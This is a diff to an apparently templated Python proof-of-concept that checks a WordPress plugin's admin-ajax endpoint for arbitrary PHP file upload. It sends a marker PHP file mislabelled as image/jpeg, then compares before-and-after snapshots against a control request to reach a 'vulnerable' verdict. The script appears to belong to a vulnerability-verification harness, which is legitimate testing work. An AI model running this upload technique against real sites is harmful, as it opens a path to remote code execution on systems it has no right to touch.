@@ -14,6 +14,7 @@ ATTACKER_ROLE = "{{ attacker_role }}"
 MARKER_NAME    = "squadrone_marker.php"
 MARKER_CONTENT = b"<?php echo 'WPVH_UPLOADED_OK_98271'; ?>"
 MARKER_SIGN    = "WPVH_UPLOADED_OK_98271"
+CONTROL_CONTENT = b"<?php echo 'WPVH_CONTROL_71420'; ?>"
 
 session = requests.Session()
 if ATTACKER_ROLE.lower() not in {"unauthenticated", "anonymous", "guest"}:
@@ -21,38 +22,101 @@ if ATTACKER_ROLE.lower() not in {"unauthenticated", "anonymous", "guest"}:
     if not login.success:
         raise RuntimeError(f"attacker login failed: {login.reason}")
 
-files_payload = {"file": (MARKER_NAME, io.BytesIO(MARKER_CONTENT), "image/jpeg")}
-data_payload  = {"action": ACTION}
-
-resp = session.post(
-    f"{TARGET}/wp-admin/admin-ajax.php",
-    files=files_payload, data=data_payload, timeout=30,
-)
-# Try to fetch the file from common upload locations to confirm it was written.
 candidates = [
     f"{TARGET}/wp-content/uploads/{MARKER_NAME}",
     f"{TARGET}/wp-content/{MARKER_NAME}",
     f"{TARGET}/{MARKER_NAME}",
 ]
+control_name = "squadrone_control.php"
+control_candidates = [url.replace(MARKER_NAME, control_name) for url in candidates]
+
+
+def snapshot(url):
+    response = session.get(url, timeout=15)
+    exists = response.status_code == 200
+    return {
+        "exists": exists,
+        "sha256": hashlib.sha256(response.content).hexdigest() if exists else "",
+        "contains_marker": exists
+        and (MARKER_SIGN in response.text or MARKER_CONTENT in response.content),
+    }
+
+
+# Measure both paths before the exploit request. This makes a file planted by
+# sandbox setup distinguishable from one created or overwritten by the plugin.
+attack_before = {url: snapshot(url) for url in candidates}
+control_before = {url: snapshot(url) for url in control_candidates}
+
+files_payload = {"file": (MARKER_NAME, io.BytesIO(MARKER_CONTENT), "image/jpeg")}
+data_payload = {"action": ACTION}
+session.post(
+    f"{TARGET}/wp-admin/admin-ajax.php",
+    files=files_payload,
+    data=data_payload,
+    timeout=30,
+)
+
+attack_after = {url: snapshot(url) for url in candidates}
+
+# Route-negative baseline. Replace this with the hypothesis-specific rejected
+# security-boundary request when refining the template, while keeping the HTTP
+# method, endpoint, and multipart payload shape comparable.
+session.post(
+    f"{TARGET}/wp-admin/admin-ajax.php",
+    files={"file": (control_name, io.BytesIO(CONTROL_CONTENT), "image/jpeg")},
+    data={"action": "squadrone_nonexistent_control"},
+    timeout=30,
+)
+control_after = {url: snapshot(url) for url in control_candidates}
+
 found_url = ""
-found_hash = ""
 for url in candidates:
-    r = session.get(url, timeout=15)
-    if r.status_code == 200 and (MARKER_SIGN in r.text or MARKER_CONTENT in r.content):
+    before = attack_before[url]
+    after = attack_after[url]
+    changed = (not before["exists"] and after["exists"]) or (
+        before["exists"]
+        and after["exists"]
+        and before["sha256"] != after["sha256"]
+    )
+    if changed and after["contains_marker"]:
         found_url = url
-        found_hash = hashlib.sha256(r.content).hexdigest()
         break
 
-control_name = "squadrone_control.php"
-control_exists = any(session.get(url.replace(MARKER_NAME, control_name), timeout=15).status_code == 200 for url in candidates)
-observed = bool(found_url) and not control_exists
+attack_url = found_url or candidates[0]
+control_url = attack_url.replace(MARKER_NAME, control_name)
+attack_pre = attack_before[attack_url]
+attack_post = attack_after[attack_url]
+control_pre = control_before[control_url]
+control_post = control_after[control_url]
+control_changed = control_pre["exists"] != control_post["exists"] or (
+    control_pre["exists"]
+    and control_post["exists"]
+    and control_pre["sha256"] != control_post["sha256"]
+)
+observed = bool(found_url) and not control_changed
 emit_result(
     verdict="vulnerable" if observed else "not_vulnerable",
     oracle="file_effect",
     attacker_role=ATTACKER_ROLE,
     request={"method": "POST", "url": f"{TARGET}/wp-admin/admin-ajax.php"},
-    attack={"observed": observed, "exists": bool(found_url), "path": found_url, "marker_sha256": found_hash},
-    control={"observed": control_exists, "exists": control_exists, "path": control_name},
+    attack={
+        "observed": observed,
+        "path": attack_url,
+        "before_exists": attack_pre["exists"],
+        "after_exists": attack_post["exists"],
+        "before_sha256": attack_pre["sha256"],
+        "marker_sha256": attack_post["sha256"],
+        "exists": attack_post["exists"],
+    },
+    control={
+        "observed": control_changed,
+        "path": control_url,
+        "before_exists": control_pre["exists"],
+        "after_exists": control_post["exists"],
+        "before_sha256": control_pre["sha256"],
+        "after_sha256": control_post["sha256"],
+        "exists": control_post["exists"],
+    },
     integrity="high" if observed else "none",
     impact="The attacker uploaded a PHP-extension marker file to a web-accessible path." if observed else "No attack-only uploaded file was observed.",
 )
